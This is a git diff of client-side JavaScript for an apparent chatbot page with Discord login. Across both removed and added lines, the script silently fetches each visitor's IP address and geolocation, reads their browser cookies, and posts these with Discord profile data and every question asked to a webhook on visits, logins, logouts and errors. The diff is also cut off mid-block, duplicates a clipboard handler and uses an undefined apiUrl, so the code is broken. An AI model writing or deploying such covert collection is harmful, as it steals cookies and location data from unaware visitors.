@@ -34,7 +34,6 @@ document.addEventListener('DOMContentLoaded', async function() {
     const logoutButton = document.getElementById("logoutButton");
     const profileUI = document.querySelector('.profile-ui');
     const discordUser = localStorage.getItem('discordUser');
-    let userData;
 
     // Dark mode toggle functionality
     toggleButton.addEventListener('click', function() {
@@ -42,115 +41,18 @@ document.addEventListener('DOMContentLoaded', async function() {
         this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
     });
 
-// Base API URL
-const apiUrl = 'https://cakestudio.onrender.com/api';
+    // Check if the user is logged in
+    if (!discordUser) {
+        // User is not logged in, redirect to login
+        window.location.href = `${apiUrl}/auth/discord`;
+        sendButton.disabled = true;
+        return; // Exit the script to prevent further execution
+    } 
 
-if (!discordUser) {
-    // User is not logged in, redirect to login
-    window.location.href = `${apiUrl}/auth/discord`;
-    sendButton.disabled = true;
-    loginButton.disabled = true;
-    logoutButton.disabled = true;
-    return; // Exit the script to prevent further execution
-}
+    // User is logged in, update UI
+    await updateUI(discordUser);
 
-// Discord login functionality
-
-async function updateUI() {
-    // let userData; // Declare userData here
-
-    if (discordUser) {
-        userData = JSON.parse(discordUser); // Initialize userData
-        const usernameElement = document.querySelector('.username');
-        usernameElement.innerText = userData.username; // Update username
-        const profilePicture = profileUI.querySelector('.profile-picture');
-        profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
-
-        // Enable logout button, disable login button
-        logoutButton.disabled = false;
-        loginButton.disabled = true;
-    } else {
-        // User is not logged in, check URL for user data
-        const urlParams = new URLSearchParams(window.location.search);
-        const userParam = urlParams.get('user');
-
-        if (userParam) {
-            // If user data is in the URL, parse and store it
-            userData = JSON.parse(decodeURIComponent(userParam)); // Now this will work
-            localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
-            await sendWebhook("User Login", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
-${userDataFormatted}
-\`\`\`
-    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
-
-
-            // Update UI with user data
-            const usernameElement = document.querySelector('.username');
-            usernameElement.innerText = userData.username; // Update username
-            const profilePicture = profileUI.querySelector('.profile-picture');
-            profilePicture.src = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}`; // Update profile picture
-
-            // Enable logout button, disable login button
-            logoutButton.disabled = false;
-            loginButton.disabled = true;
-
-            // Redirect to the desired URL
-            window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
-        } else {
-            // Not logged in and no user data in URL
-            logoutButton.disabled = true;
-            loginButton.disabled = false;
-        }
-    }
-
-    // Ensure profile UI is always visible
-    // profileUI.style.display = 'block'; // Always show profile UI
-}
-
-// Initial UI setup
-updateUI(); // Check and update UI on page load
-
-loginButton.addEventListener('click', function() {
-    const discordLoginUrl = `${apiUrl}/auth/discord`;
-    window.location.href = discordLoginUrl;
-});
-
-logoutButton.addEventListener('click', async function() {
-    // Send webhook for user logout
-    await sendWebhook("User Logout", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`json
-${userDataFormatted}
-\`\`\`
-    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user logout
-
-    // Remove user data from local storage
-    localStorage.removeItem('discordUser');
-
-    // Update the UI after logout
-    updateUI();
-
-    // Redirect to the desired URL
-    window.location.href = 'https://cakeorpastry.netlify.app/testgpt';
-});
-
-    // Fetch IP information from your API
+    // Fetch IP information
     const ipInfoResponse = await fetch(`https://ipinfo.io/json`);
     const ipData = await ipInfoResponse.json();
     const visitorCookie = document.cookie || 'No cookies found';
@@ -164,26 +66,26 @@ ${userDataFormatted}
 
     // Check if the visitor is banned
     const isBanned = bannedUsers.some(user => 
-    user.cookie === visitorCookie || 
-    user.ip === ipData.ip || 
-    (user.discord_id && user.discord_id === (userData ? userData.id : ''))
-);
+        user.cookie === visitorCookie || 
+        user.ip === ipData.ip || 
+        (user.discord_id && user.discord_id === JSON.parse(discordUser).id)
+    );
 
     if (isBanned) {
         // Handle banned user
         await sendWebhook("Banned User Visit", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`py
-${userDataFormatted}
-\`\`\`
-`.trim(), 16711680); // Red color for banned user
+        **IP:** ${ipData.ip}
+        **City:** ${ipData.city}
+        **Region:** ${ipData.region}
+        **Country:** ${ipData.country}
+        **Timezone:** ${ipData.timezone}
+        **Org:** ${ipData.org}
+        **Location:** ${ipData.loc}
+        **Cookies:** ${visitorCookie}
+        **Discord User Data:** \`\`\`json
+        ${discordUser}
+        \`\`\`
+        `.trim(), 16711680); // Red color for banned user
 
         // Disable interaction and notify the user
         sendButton.disabled = true;
@@ -195,18 +97,18 @@ ${userDataFormatted}
 
     // If not banned, show waiting message and ellipsis image
     await sendWebhook("User Visit", `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`py
-${userDataFormatted}
-\`\`\`
-`.trim(), Math.floor(Math.random() * 16777215)); // Random color for user visit
+    **IP:** ${ipData.ip}
+    **City:** ${ipData.city}
+    **Region:** ${ipData.region}
+    **Country:** ${ipData.country}
+    **Timezone:** ${ipData.timezone}
+    **Org:** ${ipData.org}
+    **Location:** ${ipData.loc}
+    **Cookies:** ${visitorCookie}
+    **Discord User Data:** \`\`\`json
+    ${discordUser}
+    \`\`\`
+    `.trim(), Math.floor(Math.random() * 16777215)); // Random color for user visit
 
     statusMessage.innerText = "Waiting...";
     statusImage.src = statusEmojis.ellipsis;
@@ -241,20 +143,20 @@ ${userDataFormatted}
 
             // Send webhook for the question
             await sendWebhook("Question Asked", `
-**Question:** ${question}
-**Response:** ${data.cevap}
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`py
-${userDataFormatted}
-\`\`\`
-`.trim(), Math.floor(Math.random() * 16777215)); // Random color
+            **Question:** ${question}
+            **Response:** ${data.cevap}
+            **IP:** ${ipData.ip}
+            **City:** ${ipData.city}
+            **Region:** ${ipData.region}
+            **Country:** ${ipData.country}
+            **Timezone:** ${ipData.timezone}
+            **Org:** ${ipData.org}
+            **Location:** ${ipData.loc}
+            **Cookies:** ${visitorCookie}
+            **Discord User Data:** \`\`\`json
+            ${discordUser}
+            \`\`\`
+            `.trim(), Math.floor(Math.random() * 16777215)); // Random color
 
             responseContainer.innerText = data.cevap;
             statusImage.src = statusEmojis.check; // Set to check emoji
@@ -264,20 +166,20 @@ ${userDataFormatted}
 
             // Send error details to the webhook
             await sendWebhook("Fetch Error", `
-**Question:** ${question}
-**Error Message:** ${error.message}
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-**Discord User Data:** \`\`\`py
-${userDataFormatted}
-\`\`\`
-`.trim(), 16711680); // Red color for errors
+            **Question:** ${question}
+            **Error Message:** ${error.message}
+            **IP:** ${ipData.ip}
+            **City:** ${ipData.city}
+            **Region:** ${ipData.region}
+            **Country:** ${ipData.country}
+            **Timezone:** ${ipData.timezone}
+            **Org:** ${ipData.org}
+            **Location:** ${ipData.loc}
+            **Cookies:** ${visitorCookie}
+            **Discord User Data:** \`\`\`json
+            ${discordUser}
+            \`\`\`
+            `.trim(), 16711680); // Red color for errors
 
             // Update the UI to reflect the error
             statusMessage.innerText = "An error occurred. Please try again later. If this error persists, inform and let the developer know.";
@@ -291,6 +193,20 @@ ${userDataFormatted}
             sendButton.innerText = "Send";
         }, 3000); // 3-second cooldown
     });
+
+    // Copy to clipboard functionality
+    const copyButton = document.getElementById('copyResponseToClipboard');
+    copyButton.addEventListener('click', function() {
+        const textToCopy = responseContainer.innerText; // Get the text from the <P> element
+        if (textToCopy) {
+            copyButton.disabled = true; // Disable the button
+            const originalText = copyButton.innerText; // Store original button text
+            copyButton.innerText = "Copied!"; // Change button text
+
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                // Cooldown before re-enabling the button
+                setTimeout(() => {
+                    copyButton.innerText = originalText; // Restore
 
     // Copy to clipboard functionality
     const copyButton = document.getElementById('copyResponseToClipboard');
